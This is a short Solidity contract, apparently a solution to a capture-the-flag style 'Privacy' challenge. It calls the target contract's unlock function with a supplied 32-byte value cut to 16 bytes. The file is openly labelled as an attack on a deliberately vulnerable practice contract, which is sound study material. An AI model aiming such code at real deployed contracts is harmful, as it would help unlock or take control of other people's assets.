// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Privacy.sol";

contract AttackPrivacy {
    address victim;

    constructor(address _victim) public {
        victim = _victim;
    }

    function attack(bytes32 _data) public {
        Privacy(victim).unlock(bytes16(_data));
    }
}
